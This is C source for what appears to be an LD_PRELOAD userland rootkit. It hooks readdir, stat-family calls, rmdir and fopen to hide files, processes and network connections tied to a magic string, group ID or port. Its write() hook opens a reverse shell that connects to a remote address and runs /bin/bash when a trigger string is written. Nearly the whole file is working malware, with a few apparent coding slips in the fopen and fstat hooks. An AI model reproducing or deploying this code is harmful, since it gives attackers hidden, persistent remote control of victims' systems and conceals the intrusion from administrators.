#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <netinet/in.h>
#include <errno.h>
#include "rootkit.h"


static struct dirent* (*old_readdir)(DIR *dir) = NULL;
static struct dirent64* (*old_readdir64)(DIR *dir) = NULL;
static FILE* (*old_fopen)(const char *path, const char *mode) = NULL;
static FILE* (*old_fopen64)(const char *path, const char *mode) = NULL;
static int (*old_rmdir)(const char *path) = NULL;
static int (*old_fxstat)(int ver, int fildes, struct stat *buf) = NULL;
static int (*old_fxstat64)(int ver, int fildes, struct stat64 *buf) = NULL;
static int (*old_lxstat)(int ver, const char *path, struct stat *buf) = NULL;
static int (*old_lxstat64)(int ver, const char *path, struct stat64 *buf) = NULL;
static int (*old_xstat)(int ver, const char *path, struct stat *buf) = NULL;
static int (*old_xstat64)(int ver, const char *path, struct stat64 *buf) = NULL;
static ssize_t (*old_write)(int fd, const void *buf, size_t count) = NULL;


void IPv4() {
    int sockfd;
    setgid((gid_t)MAGIC_GID);
    pid_t pid = fork();

    if(pid < 0) return;
    if(pid == 0) {
        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(0x0);
        struct sockaddr_in server, client;

        inet_pton(AF_INET, REMOTE_ADDR_4, &server.sin_addr);
        server.sin_port = htons(REMOTE_PORT);
        server.sin_family = AF_INET;

        client.sin_addr.s_addr = INADDR_ANY;
        client.sin_port = htons(LOCAL_PORT);
        client.sin_family = AF_INET;

        if (bind(sockfd, (struct sockaddr *)&client, sizeof(client)) == -1) exit(0x0);
        if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) exit(0x0);
        for(int i = 0; i < 3; i++) dup2(sockfd, i);
        execve("/bin/bash", NULL, NULL);
        close(sockfd);
        exit(0x0);
    }
}


struct dirent* readdir(DIR *dir) {
    struct dirent *dir_;

    if(old_readdir == NULL) old_readdir = dlsym(RTLD_NEXT, "readdir");
    while((dir_ = old_readdir(dir))) {
        if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
    }
    return dir_;
}


struct dirent64* readdir64(DIR *dir) {
    struct dirent64 *dir_;

    if(old_readdir64 == NULL) old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    while((dir_ = old_readdir64(dir))) {
        if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
    }
    return dir_;
}


FILE* fopen(const char *path, const char *mode) {
    if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen64");
    if(strcmp(path, PROC_NET_TCP) == 0 || strcmp(path, PROC_NET_TCP6) == 0) {
        FILE *tmp = tmpfile(), *old_file;
        char *buff = NULL;
        size_t buff_length = 0;

        if((old_file = old_fopen(path, mode)) != NULL) {
            while(getline(&buff, &buff_length, old_file) != -1) {
                if(strstr(buff, KEY_PORT) == NULL)
                    fputs(buff, tmp);
            }
            fclose(old_file);
            free(buff);
            buff = NULL;
            rewind(tmp);

            return tmp;
        }
        if(tmp != NULL) fclose(tmp);
    }
    return old_fopen(path, mode);
}


FILE* fopen64(const char *path, const char *mode) {
    if(old_fopen64 == NULL) old_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    if(strcmp(path, PROC_NET_TCP) == 0 || strcmp(path, PROC_NET_TCP6) == 0) {
        FILE *tmp = tmpfile64(), *old_file;
        char *buff = NULL;
        size_t buff_length = 0;

        if((old_file = old_fopen64(path, mode)) != NULL) {
            while(getline(&buff, &buff_length, old_file) != -1) { 
                if(strstr(buff, KEY_PORT) == NULL)
                    fputs(buff, tmp);
            }
            fclose(old_file);
            free(buff);
            buff = NULL;
            rewind(tmp);

            return tmp;
        }
        if(tmp != NULL) fclose(tmp);
    }
    return old_fopen64(path, mode);
}


int rmdir(const char *path) {
    if(old_rmdir == NULL) old_rmdir = dlsym(RTLD_NEXT, "rmdir");

    #if __x86_64__
        struct stat64 tmp_stat;

        if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
        memset(&tmp_stat, 0, sizeof(stat64));
        old_xstat64(_STAT_VER, path, &tmp_stat);
    #else
        struct stat tmp_stat;

        if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
        memset(&tmp_stat, 0, sizeof(stat));
        old_xstat(_STAT_VER, path, &tmp_stat);
    #endif

    if(strstr(path, MAGIC_STRING) == NULL || tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_rmdir(path);
}


int __fxstat(int ver, int fildes, struct stat *buf) {
    struct stat tmp_stat;

    if(old_fxstat == NULL) old_fxstat = dlsym(RTLD_NEXT, "__fxstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_fxstat(ver, fildes, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_fxstat(ver, fildes, buf);
}


int __fxstat64(int ver, int fildes, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_fxstat64 == NULL) old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_fxstat64(ver, fildes, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_fxstat64(ver, fildes, buf);
}


int __lxstat(int ver, const char *path, struct stat *buf) {
    struct stat tmp_stat;

    if(old_lxstat == NULL) old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_lxstat(ver, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat(ver, path, buf);
}


int __lxstat64(int ver, const char *path, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_lxstat64 == NULL) old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_lxstat64(ver, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat64(ver, path, buf);
}


int __xstat(int ver, const char *path, struct stat *buf) {
    struct stat tmp_stat;

    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_xstat(ver, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat(ver, path, buf);
}


int __xstat64(int ver, const char *path, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_xstat64(ver, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat64(ver, path, buf);
}


int fstat(int fd, struct stat *buf) {
    struct stat tmp_stat;

    if(old_fxstat == NULL) dlsym(RTLD_NEXT, "__fxstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_fxstat(_STAT_VER, fd, &tmp_stat);
    
    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_fxstat(_STAT_VER, fd, buf);
}


int fstat64(int fd, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_fxstat64 == NULL) old_fxstat64 = dlsym(RTLD_NEXT, "__fxstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_fxstat64(_STAT_VER, fd, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_fxstat64(_STAT_VER, fd, buf);
}


int lstat(const char *path, struct stat *buf) {
    struct stat tmp_stat;
    
    if(old_lxstat == NULL) old_lxstat = dlsym(RTLD_NEXT, "__lxstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_lxstat(_STAT_VER, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat(_STAT_VER, path, buf);
}


int lstat64(const char *path, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_lxstat64 == NULL) old_lxstat64 = dlsym(RTLD_NEXT, "__lxstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_lxstat64(_STAT_VER, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_lxstat64(_STAT_VER, path, buf);
}


int stat(const char *path, struct stat *buf) {
    struct stat tmp_stat;

    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
    memset(&tmp_stat, 0, sizeof(stat));
    old_xstat(_STAT_VER, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat(_STAT_VER, path, buf);
}


int stat64(const char *path, struct stat64 *buf) {
    struct stat64 tmp_stat;

    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
    memset(&tmp_stat, 0, sizeof(stat64));
    old_xstat64(_STAT_VER, path, &tmp_stat);

    if(tmp_stat.st_gid == MAGIC_GID) {
        errno = ENOENT;
        return -1;
    }
    return old_xstat64(_STAT_VER, path, buf);
}


ssize_t write(int fd, const void *buf, size_t count) {
    if(old_write == NULL) old_write = dlsym(RTLD_NEXT, "write");

    if(strstr(buf, KEY_STRING) != NULL) {
        fd = open("/dev/null", O_WRONLY | O_APPEND);   
        IPv4();
    }
    return old_write(fd, buf, count);
}
